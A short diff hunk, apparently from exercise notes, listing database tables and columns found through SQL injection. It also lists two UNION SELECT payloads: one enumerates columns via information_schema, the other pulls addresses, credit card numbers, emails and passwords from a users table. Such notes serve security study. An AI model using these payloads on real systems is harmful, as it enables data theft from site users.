@@ -21,6 +21,5 @@ artists,carts,categ,featured,guestbook,pictures,products,users
 address,cart,cc,email,name,pass,phone,uname
 0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'products' #
 0 UNION SELECT address,cart,cc,email,name,pass,phone,uname,null,null,null FROM users #
-
 '''
 
